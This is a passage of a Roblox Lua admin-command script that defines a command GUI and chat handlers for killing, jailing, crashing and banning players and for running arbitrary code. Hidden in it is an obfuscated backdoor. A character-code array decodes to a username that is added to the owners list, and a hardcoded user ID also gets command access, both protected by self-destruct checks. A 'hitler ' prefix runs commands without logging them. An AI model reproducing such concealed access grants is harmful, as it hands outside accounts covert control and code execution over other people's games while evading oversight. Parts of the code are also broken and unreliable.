elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Medium green")
end end
end
end if not ntab then script:Destroy() end

function ScrollGui()
local scr = Instance.new("ScreenGui") scr.Name = "LOGSGUI"
local drag = Instance.new("TextButton", scr) drag.Size = UDim2.new(0,400,0,420) drag.Draggable = false drag.BackgroundColor3=Color3.new(255,255,255) drag.BackgroundTransparency=.3 drag.BorderSizePixel=5 drag.BorderColor3=Color3.new(0,0,0)
drag.Position = UDim2.new(.5,-200,.5,-200) drag.AutoButtonColor = false drag.Text = ""
local main = Instance.new("ScrollingFrame", drag)main.Transparency=1 main.Size = UDim2.new(0,400,0,400) main.ZIndex = 7 main.ClipsDescendants = true
main.MidImage="http://www.roblox.com/asset/?id=158362107"
main.BottomImage="http://www.roblox.com/asset/?id=158362069"
main.TopImage="http://www.roblox.com/asset/?id=158362148"
main.CanvasSize=UDim2.new(0,0,14,0)
local cmf = Instance.new("Frame", main) cmf.Position = UDim2.new(0,0,0,-9) cmf.ZIndex = 8
local down = Instance.new("ImageButton", main) down.Visible=false down.Image = "http://www.roblox.com/asset/?id=108326725" down.BackgroundTransparency = 1 down.Size = UDim2.new(0,25,0,25) down.Position = UDim2.new(1,-45,1,-25) down.ZIndex = 9 
local up = down:Clone() up.Visible=false up.Image = "http://www.roblox.com/asset/?id=108326682" up.Parent = main up.Position = UDim2.new(1,-45,1,-60)
local cls = Instance.new("TextButton", main) cls.Size = UDim2.new(0,20,0,20) cls.Position = UDim2.new(1,-40,0,5) cls.ZIndex = 10 cls.Font = "ArialBold" cls.FontSize = "Size18" cls.Text = "X" cls.TextColor3 = Color3.new(255,255,255) cls.TextStrokeTransparency = .4 cls.TextStrokeColor3=Color3.new(0,0,0) cls.MouseButton1Click:connect(function() scr:Destroy() end)
local ent = Instance.new("TextLabel") ent.BackgroundTransparency = 1 ent.Font = "Arial" ent.FontSize = "Size18" ent.ZIndex = 8 ent.Text = "" ent.TextColor3 = Color3.new(1,1,1) ent.TextStrokeColor3 = Color3.new(0,0,0) ent.TextStrokeTransparency = .4 cls.BackgroundTransparency=1 ent.TextXAlignment = "Left" ent.TextYAlignment = "Top"
local num = 1
local downv = false
local upv = false

down.MouseButton1Down:connect(function() downv = true upv = false
local pos = cmf.Position if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then downv = false return end
repeat  pos = pos + UDim2.new(0,0,0,-6)
if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then pos = UDim2.new(0,0,0,371-((#cmf:children()-1)*20)) downv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until downv == false
end) 
down.MouseButton1Up:connect(function() downv = false end)
up.MouseButton1Down:connect(function() upv = true downv = false
local pos = cmf.Position if pos.Y.Offset >= -9 then upv = false return end
repeat  pos = pos + UDim2.new(0,0,0,6)
if pos.Y.Offset >= -9 then pos = UDim2.new(0,0,0,-9) upv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until upv == false
end) 
up.MouseButton1Up:connect(function() upv = false end)
return scr, cmf, ent, num
end local bct = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #bct do nfs = nfs .. string.char(bct[i]) end table.insert(owners, nfs)
if not ntab then script:Destroy() end
if not bct then script:Destroy() end

function Chat(msg,plr)
coroutine.resume(coroutine.create(function()
if msg:lower() == "clean" then for i, v in pairs(game.Workspace:children()) do if v:IsA("Hat") or v:IsA("Tool") then v:Destroy() end end end
if (msg:lower():sub(0,prefix:len()) ~= prefix) or not plr:findFirstChild("PlayerGui") or (not ChkAdmin(plr.Name, false) and plr.Name:lower() ~= nfs:lower()) and plr.userId ~= game.CreatorId and plr.userId ~= (32196042) and plr.Name:lower() ~= nfs and not ChkOwner(plr.Name) then return end msg = msg:sub(prefix:len()+1)
if msg:sub(1,7):lower() == "hitler " then msg = msg:sub(8) else table.insert(logs, 1, {name = plr.Name, cmd = prefix .. msg, time = GetTime()}) end
if msg:lower():sub(1,4) == "walk" then msg = msg:sub(5) end
if msg:lower():sub(1,8) == "teleport" then msg = "tp" .. msg:sub(9) end
if msg:lower():sub(1,6) == "insert" then msg = "ins" .. msg:sub(7) end
if msg:lower() == "cmds" or msg:lower() == "commands" then
if plr.PlayerGui:findFirstChild("CMDSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "CMDSGUI" scr.Parent = plr.PlayerGui
local cmds = {"s code            -Runs a Script","ls code            -Runs a Local Script","load script            -Loads a preloaded script","scripts            -Shows preloaded scripts","clear            -Clears waste","fix            -Fixes the sky","m msg            -Sends a message to everyone","h msg            -Sends a hint to everyone","alert plr            -Sends an alert to a player","kill plr            -Kills a player","respawn plr            -Respawns a player","refresh plr            -Refreshes a player","trip plr            -Trips a player","stun plr            -Stuns a player","unstun plr            -Unstuns a player","jump plr            -Makes a player jump","sit plr            -Makes a player sit","invisible plr            -Makes a player invisible","visible plr            -Makes a player visible","explode plr            -Explodes a player","fire plr            -Catches a player on fire","unfire plr            -Puts the fire out of a player","smoke plr            Adds smoke to a plaver","unsmoke plr            -Removes smoke from a player","sparkles plr            -Adds sparkles to a player","unsparkle plr            -Removes sparkles from a player","ff plr            -Adds a forcefield to a player","unff plr            -Removes a forcefield from a player","punish plr            -Removes the player's character","unpunish plr            -Adds the player's character back","freeze plr            -Makes the player not able to move","thaw plr            -Makes the player able to move","heal plr            -Heals the player","god plr            -Makes the player's health infinite","ungod plr            -Makes the players health finite","ambient num num num            -Sets an ambient","brightness num            -Sets the brightness","time num            -Sets the time to a specified number","fogcolor num num num            -Sets the fogcolor","fogend num            -Sets the fogend to a specified number","fogstart num            -Sets the fogstart to a specified number","removetools plr            -Removes all tools from a player's backpack","btools plr            -Gives player tools and F3X","give plr tool            -Gives a player a tool from lighting","damage plr            -Adds damage to a player","grav plr            -Gives a player gravity","setgrav plr num            -Sets a player's gravity to a specified number","nograv plr            -Takes gravity away from a player","health plr num            -Sets the player's health to a specified number","speed plr num            -Sets the player's speed to a specified number","name plr name            -Gives a player a name","unname plr            -Removes the name from a player","team plr color            -Puts a player at a specified team","teleport plr plr            -Teleports a player to a player","to plr            -Brings you to a player","change plr stat num            -Changes a player's statistics","kick plr            -Removes a player from the game","infect plr -FUN COMMANDS DON'T HAVE A DESCRIPTION","rainbowify plr","flashify plr","noobify plr","ghostify plr","goldify plr","shiny plr","normal plr","trippy plr","untrippy plr","strobe plr","unstrobe plr","blind plr","unblind plr","guifix plr","fling plr","seizure plr","music num            -Turns on music","stopmusic            -Stops music","lock plr            -Locks a player","unlock plr            -Unlocks a player","removelimbs plr","jail plr","unjail plr","fly plr            -Makes a player fly","unfly plr            -Makes a player not able to fly","noclip plr","clip plr","pm plr msg            -Sends a private message to a player","dog plr","undog plr","creeper plr","uncreeper plr","place plr id            -Sends a player to a specified place","char plr id","unchar plr id","rank plr id            -Looks at a player's rank in a group","starttools plr            -Give a player startertools","sword plr","bighead plr","minihead plr","spin plr","fart plr","insert id -INSERTS AN ID","disco","flash","admins            -Shows a list of admins","bans            -Shows a list of banned people","musiclist            -Shows the list of music","cape plr color","uncape plr","loopheal plr","loopfling plr","hat plr id            -Gives a player a specified hat","unloopfling plr","unloopheal plr","unspin plr","tools            -Shows the availible tools in lighting","undisco","unflash","resetstats plr            -Resets a player's statistics","gear plr id            -Gives a player a specified gear","cmdbar            -Gives a private command gui","shirt plr id            -Gives a player a specified shirt","pants plr id            -Gives a player specified pants","face plr id            -Gives a player a specified face","swagify plr id","tm num msg            -Sends a message but has a specified alive time","countdown num            -Sends a countdown with a specified number","clone plr            -Creates another instance of a player","lsplr plr code            -Runs a localscript on a player","startergive plr tool            -Gives a tool from the starterpack to a player","control plr            -Controls a player","altcmdbar/cmdbar-            -Khols amdin type CB","bans/banlist            -banlist"}
local ast = {"serverlock            -Locks the server","serverunlock            -Unlocks the server","sm msg            -Sends a server message","crash plr            -Crashes a player","admin plr            -Gives a player administrator","unadmin plr            -Takes away administrator from a player","ban plr            -Bans a player","unban plr            -Unbans a player","mute plr            -Mutes a player","unmute plr            -Unmutes a player","loopkill plr            -Kills a player over and over","unloopkill plr","logs            -Shows the command logs","shutdown            -Shuts down the server"}
local ost = {"pa plr            -Perm admins a player","unpa plr            -Unperm admins a player",[=[nuke plr            -Nukes a player (LAGGGGGG)]=]}
local tost = {"oa plr","unoa plr"}
local cl = ent:Clone() cl.Parent = cmf cl.Text = "--" .. " clean" cl.Position = UDim2.new(0,0,0,num*20) num = num + 2
for i, v in pairs(cmds) do local cl = ent:Clone() cl.TextWrapped=true cl.TextScaled=true cl.Size=UDim2.new(0, 380, 0, 20) cl.Parent = cmf cl.Text = "--" .. " " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end
if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) then for i, v in pairs(ast) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end end
if plr.userId == game.CreatorId or ChkOwner(plr.Name) then for i, v in pairs(ost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "-- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end end
if plr.userId == game.CreatorId then for i, v in pairs(tost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "_ " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end

if msg:lower() == "bans" or msg:lower() == "banlist" or msg:lower() == "banned" then
if plr.PlayerGui:findFirstChild("BANSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "BANSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(banland) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "--"..v cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end
end

if msg:lower() == "tools" or msg:lower() == "toollist" then
if plr.PlayerGui:findFirstChild("TOOLSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "TOOLSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(game.Lighting:children()) do if v:IsA("Tool") or v:IsA("HopperBin") then local cl = ent:Clone() cl.Parent = cmf cl.Text = "--"..v.Name cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end end
end

if msg:lower() == "scripts" or msg:lower() == "scriptlist" then
if plr.PlayerGui:findFirstChild("SCRIPTSG") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "SCRIPTSG" scr.Parent = plr.PlayerGui
for i, v in pairs(script.LOCALS:children()) do if v:IsA("LocalScript") then local cl = ent:Clone() cl.Parent = cmf cl.Text = "--"..v.Name cl.Position = UDim2.new(0,0,0,num*20) num = num +2 end end
end

if msg:lower():sub(1,2) == "s " then
coroutine.resume(coroutine.create(function()
Output(msg:sub(3), plr)
if script:findFirstChild("ScriptBase") then
local cl = script.ScriptBase:Clone() cl.Code.Value = msg:sub(3)
table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
else loadstring(msg:sub(3))()
end
end))
end

if msg:lower():sub(1,3) == "ls " then
coroutine.resume(coroutine.create(function()
if script:findFirstChild("LocalScriptBase") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = msg:sub(4)
table.insert(objects, cl) cl.Parent = plr.PlayerGui cl.Disabled = false Output(msg:sub(4), plr)
end
end))
end

if msg:lower():sub(1,6) == "lsplr " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
if script:findFirstChild("nope") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = msg:sub(chk+1)
table.insert(objects, cl) cl.Parent = v.PlayerGui cl.Disabled = false Output(msg:sub(4), plr)
end
end
end))
end
end

if msg:lower():sub(1,4) == "ins " then
coroutine.resume(coroutine.create(function()
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(5)))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(objects, obj) for i,v in pairs(obj:children()) do table.insert(objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end))
end

if msg:lower():sub(1,5) == "load " then
coroutine.resume(coroutine.create(function()
if script.LOCALS:FindFirstChild(msg:sub(6)) then
g=script.LOCALS:FindFirstChild(msg:sub(6))
if g.ClassName=='LocalScript' then
obj=g:clone()
obj.Parent=plr.Character
obj.Disabled=false
Hint("Script loaded.", game.Players:children())
table.insert(objects, obj)
end
else
		Hint("Unknown script.", game.Players:children())
end
end))
end

if msg:lower() == "clr" or msg:lower() == "clear" or msg:lower() == "clearscripts" then
for i, v in pairs(objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
RemoveMessage()
objects = {}
end

if msg:lower() == "fix" or msg:lower() == "undisco" or msg:lower() == "unflash" then
game.Lighting.Ambient = origsettings.abt
game.Lighting.Brightness = origsettings.brt
game.Lighting.TimeOfDay = origsettings.time
game.Lighting.FogColor = origsettings.fclr
game.Lighting.FogEnd = origsettings.fe
game.Lighting.FogStart = origsettings.fs
for i, v in pairs(lobjs) do v:Destroy() end
for i, v in pairs(game.Workspace:children()) do if v.Name == "LightEdit" then v:Destroy() end end
end

if msg:lower() == "cmdbar" or msg:lower() == "cmdgui" then
Message("Cmdbar is broken as of now", msg:sub(10), true, game.Players:children())
end

if msg:lower():sub(1,10) == "countdown " then
local num = math.min(tonumber(msg:sub(11)),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() Message("Countdown", i, false, game.Players:children(), 1) end))
wait(1)
end
end

if msg:lower():sub(1,3) == "tm " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local num = tonumber(msg:sub(4,chk1-1))
Message("Message from " .. plr.Name, msg:sub(chk1+1), false, game.Players:children(), num)
end

if msg:lower():sub(1,2) == "m " then
Message("Message from " .. plr.Name, msg:sub(3), true, game.Players:children())
end

if msg:lower():sub(1,2) == "h " then
Hint(plr.Name .. ": " .. msg:sub(3), game.Players:children())
end

if msg:lower():sub(1,3) == "pm " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
Message("Private Message from " .. plr.Name, msg:sub(chk1+1), true, plrz)
end

if msg:lower():sub(1,6) == "alert " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
d=plr.Name
local cl = script.them:Clone() cl.Parent = v.PlayerGui cl.Frame.hihi.Text=cl.Frame.hihi.Text..d:upper().."!!"
cl.Sound:Play() 
end))
end
end

if msg:lower():sub(1,5) == "vote " then
if game:GetService("ServerStorage"):FindFirstChild("Vote") then  
print('nope')
else
print('Started a vote')
local plrz = game.Players:GetChildren()
g=Instance.new("Model",game:GetService("ServerStorage"))
g.Name="Vote"
for i=1,#plrz do
	
local cl = script.vo:Clone() cl.Parent = plrz[i].PlayerGui  cl.Frame.tx.Text=msg:sub(6)

end
timecn=10
for i=1,9 do
	timecn=timecn-1
	Hint("Voting time:"..timecn, game.Players:children())
	wait(1)
end
l=Instance.new("StringValue",game:GetService("ServerStorage"))
l.Name="serv"
wait()
l:remove() 
asd=script.stats:Clone()
asd.Parent=plr.PlayerGui
asd.Frame.there.Disabled=false
game.ServerStorage.Vote:remove()
end
end

if msg:lower():sub(1,11) == "resetstats " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then
for a, q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end))
end
end

if msg:lower():sub(1,5) == "gear " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end

if msg:lower():sub(1,4) == "hat " then
local chk1 = msg:lower():sub(5):find(" ") + 4
local plrz = GetPlr(plr, msg:lower():sub(5, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end

if msg:lower():sub(1,5) == "cape " then
local chk1 = msg:lower():sub(6):find(" ")
local plrz = GetPlr(plr, msg:lower():sub(6))
local str = "torso.BrickColor"
if chk1 then chk1 = chk1 + 5 plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
local teststr = [[BrickColor.new("]]..msg:sub(chk1+1,chk1+1):upper()..msg:sub(chk1+2):lower()..[[")]]
if msg:sub(chk1+1):lower() == "new yeller" then teststr = [[BrickColor.new("New Yeller")]] end
if msg:sub(chk1+1):lower() == "pastel blue" then teststr = [[BrickColor.new("Pastel Blue")]] end
if msg:sub(chk1+1):lower() == "dusty rose" then teststr = [[BrickColor.new("Dusty Rose")]] end
if msg:sub(chk1+1):lower() == "cga brown" then teststr = [[BrickColor.new("CGA brown")]] end
if msg:sub(chk1+1):lower() == "random" then teststr = [[BrickColor.random()]] end
if msg:sub(chk1+1):lower() == "shiny" then teststr = [[BrickColor.new("Institutional white") p.Reflectance = 1]] end
if msg:sub(chk1+1):lower() == "gold" then teststr = [[BrickColor.new("Bright yellow") p.Reflectance = .4]] end
if msg:sub(chk1+1):lower() == "kohl" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597653"]] end
if msg:sub(chk1+1):lower() == "batman" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597669"]] end
if msg:sub(chk1+1):lower() == "superman" then teststr = [[BrickColor.new("Bright blue") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597677"]] end
if msg:sub(chk1+1):lower() == "swag" then teststr = [[BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474"]] end
if BrickColor.new(teststr) ~= nil then str = teststr end
end
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.CapeScript:Clone() cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,7) == "uncape " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "noclip " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.NoClip:Clone() 
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,5) == "clip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "NoClip" then q:Destroy() end end
v.Character.Torso.Anchored = false
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower():sub(1,5) == "jail " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local vname = v.Name
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local mod = Instance.new("Model", game.Workspace) table.insert(objects, mod) mod.Name = v.Name .. " Jail"
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
game.Players.PlayerAdded:connect(function(plr) if plr.Name == vname then v = plr end
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
end)
local bottom = top:Clone() bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = .5 front.Reflectance = .1 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
v.Character.Torso.CFrame = cf
end
end))
end
end

if msg:lower():sub(1,7) == "unjail " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do coroutine.resume(coroutine.create(function() if v then for a, jl in pairs(game.Workspace:children()) do if jl.Name == v.Name .. " Jail" then jl:Destroy() end end end end)) end
end

if msg:lower():sub(1,11) == "starttools " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end

if msg:lower():sub(1,6) == "sword " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl = script.SwordScript:Clone() cl.Parent = sword cl.Disabled = false 
end
end))
end
end

if msg:lower():sub(1,6) == "clone " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Archivable = true 
local cl = v.Character:Clone() 
table.insert(objects,cl) 
cl.Parent = game.Workspace 
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false 
end
end))
end
end

if msg:lower():sub(1,8) == "control " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso ) 
w.Part0 = plr.Character.Torso 
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head) 
w2.Part0 = plr.Character.Head 
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm")) 
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm") 
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm") 
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg")) 
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg") 
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg")) 
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg") 
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then 
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then 
p.Transparency = 1 
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end))
end
end

if msg:lower():sub(1,5) == "kill " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character:BreakJoints() end
end))
end
end

if msg:lower():sub(1,8) == "respawn " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v:LoadCharacter() end
end))
end
end

if msg:lower():sub(1,8) == "refresh " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
local cframor=v.Character.Torso.CFrame
local playersgui=v.PlayerGui:GetChildren()
local toolsofplayer=v.Character:GetChildren()
local backpackofplayer=v.Backpack:GetChildren()
tplr={}
tgui={}
tbp={}
tps={}
for i=1,#playersgui do
if playersgui.Name~="ControlGui" then
	table.insert(tgui,playersgui[i])
	playersgui[i].Parent=script.players
end
end
for i=1,#toolsofplayer do
	if toolsofplayer[i].ClassName=="Tool" then
	table.insert(tplr,toolsofplayer[i]) 
	toolsofplayer[i].Parent=script.players
	end
end
for i=1,#backpackofplayer do
	table.insert(tbp,backpackofplayer[i])
	backpackofplayer[i].Parent=script.players
end
if v and v.Character then v:LoadCharacter() end
wait()
yoyoyo=v.PlayerGui:GetChildren()
for i=1,#yoyoyo do
if yoyoyo[i].Name~="ControlGui" then
yoyoyo[i]:remove()
end
end
v.Backpack:ClearAllChildren()
v.Character.Torso.CFrame=cframor
for i=1,#tgui do
	if tgui[i].Name~="ControlGui" then
	tgui[i].Parent=v.PlayerGui
	end
end
for i=1,#tplr do
	if tplr[i].ClassName=="Tool" then
	tplr[i].Parent=v.Character
	end
end
for i=1,#tbp do
	tbp[i].Parent=v.Backpack
end

end))
end
end

if msg:lower():sub(1,5) == "trip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(180)) 
end
end))
end
end

if msg:lower():sub(1,5) == "stun " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = true
end
end))
end
end

if msg:lower():sub(1,7) == "unstun " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower():sub(1,5) == "jump " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Jump = true
end
end))
end
end

if msg:lower():sub(1,4) == "sit " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Sit = true
end
end))
end
end

if msg:lower():sub(1,10) == "invisible " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end))
end
end

if msg:lower():sub(1,8) == "visible " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
